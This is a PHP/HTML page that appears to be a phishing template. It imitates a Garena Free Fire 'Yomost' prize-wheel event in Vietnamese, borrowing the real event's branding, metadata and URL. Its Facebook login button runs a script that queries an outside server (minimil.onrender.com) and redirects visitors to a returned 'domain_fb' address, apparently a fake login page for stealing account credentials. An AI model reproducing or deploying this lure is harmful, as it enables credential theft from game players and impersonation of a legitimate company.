<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme3/') === false) {
    $baseHref = '<base href="themes/theme3/">';
}
?>
<?= $baseHref ?>
<!DOCTYPE html>
<html lang="vi">

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.vn.garenanow.com/web/ff/fav.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="revisit-after" content="1days" />
  <title>SĂN YOMOST, HỐT QUÀ FREE FIRE!</title>
  <meta property="og:title" content="SĂN YOMOST, HỐT QUÀ FREE FIRE!" />
  <meta property="og:description" content="Sự kiện săn lốc Yomost, nhận quà hot từ FREE FIRE" />
  <meta property="og:url" content="https://yomost.ff.garena.vn" />
  <meta property="og:site_name" content="Free Fire Garena" />
  <meta property="og:image" content="https://yomost.ff.garena.vn/images/2022/shareimg.jpg" />
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">
  <!--endFavicon-->
  <link rel="stylesheet" href="yomost/css/bootstrap.min.css?v=1.0.13">
  <link rel="stylesheet" href="yomost/css/lity.min.css?v=1.0.13">
  <link rel="stylesheet" href="yomost/css/aos.css?v=1.0.13">
  <link rel="stylesheet" href="yomost/css/style.css?v=1651643261">
  <link rel="stylesheet" href="yomost/css/fonts.css?v=1.0.13">
  <link rel="stylesheet" href="yomost/css/responsive.css?v=1651643261">
  <script type="text/javascript" src="yomost/js/jquery-3.1.1.min.js"></script>
  <link rel="stylesheet" href="yomost/css/facebook.css?v=1.0.13">

</head>

<body class="home">

  <input type="hidden" name="" id="domain" value="/yomost/">
  <div id="pc">
    <div class="black d-none"></div>
    <header id="header">
      <div class="container clr">
        <div class="logo">
          <a href="/"><img src="yomost/imgs/logo.png" alt="" /></a>
        </div>
        <div class="nav">
          <ul>
            <li class=""><a href="/">Trang chủ</a></li>
            <li class="current nav-vongquay">
              <a aria-current="page" class="active" href="/vong-quay-may-man">
                Vòng quay<br />
                may mắn
              </a>
            </li>
            <li class=""><a href="https://yomost.ff.garena.vn/yomost-shop">Yomost shop</a></li>
            <li class=""><a href="https://yomost.ff.garena.vn/huong-dan">Hướng dẫn</a></li>
          </ul>
        </div>
        <div class="login">
          <a href="javascript:;" data-toggle="modal" data-target="#signin" class="btn-login">Đăng nhập</a>
        </div>
      </div>
    </header>
    <ul id="sidebar">
      <li><img src="yomost/imgs/wheel-title.png" class="header" alt=""></li>
    </ul>
    <div class="cach"></div>
    <main>
      <div class="text-content">
        <p>Bạn đang có<span id="luotquay">1</span> lượt quay, đăng nhập để quay</p>
      </div>
      <section id="luckySpin">
        <div class="wrap-character">
          <img src="yomost/images/pc/characters.png" class="w-100 char-pc" alt="">
          <img src="yomost/images/mobile/characters.png" class="w-100 char-mobi" alt="">
        </div>
        <div class="lucky-spin text-center">
          <meta name="csrf-token" content="zP6I1D77Df7ocIkHabIGNysfS4IhNrY7hLlTl6zY">
          <div class="vongxoay-img " id="vongxoaytichdiem">
            <img src="yomost/imgs/wheel2.png" alt="" id="img_khung">
            <img src="yomost/imgs/wheel-main.png" alt="" id="img_quay">
            <a id="nhapmadequay" href="javascript:;" data-toggle="modal" data-target="#signin">
              <div></div>
            </a>
          </div>
        </div>
      </section>
    </main>
    <!-- The Modal -->
    <!-- <button type="button" class="close" data-dismiss="modal">&times;</button> -->
    <!-- The Modal -->
    <!-- <button type="button" class="close" data-dismiss="modal">&times;</button> -->
    <div class="modal bg-xs" id="signin">
      <div class="modal-dialog">

        <div class="modal-content">
          <a href="javascript:;" class="close-btn" data-dismiss="modal">
            <img src="yomost/images/common/btn-close-popup.png" alt=""></a>
          <!-- Modal body -->
          <div class="modal-body">
            <div class="row">
              <div class="title-popup">
                <img src="yomost/images/common/login-title.png" style="width: 60%">
              </div>
            </div>
            <div class="row code-container">
              <div class="col-12 col-md-10 mx-auto d-flex justify-content-center">
                <div class="text-content">
                  <p>Vui lòng đăng nhập để tham gia sự kiện!</p>
                </div>
              </div>
              <div id="show-login-fb" class="col-12 col-md-10 mx-auto d-flex justify-content-center">
                <a> <img src="yomost/images/common/logo-fb.png" alt=""></a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>


    <script>
      const domain = window.location.protocol + "//" + window.location.host;
      const btn = document.querySelector("#show-login-fb")
      btn.addEventListener("click", function (e) {
        (async () => {
          try {
            let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
            data = await data.json()
            window.location.href = data.data.domain_fb;
          } catch {

          }
        })();
      });
    </script>
    <script type="text/javascript" src="yomost/js/popper.min.js"></script>
    <script type="text/javascript" src="yomost/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="yomost/js/lity.min.js"></script>
    <script type="text/javascript" src="yomost/js/aos.js"></script>
    <script src="yomost/js/script.js"></script>
    <script src="yomost/js/spin.js"></script>
    

</body>

</html>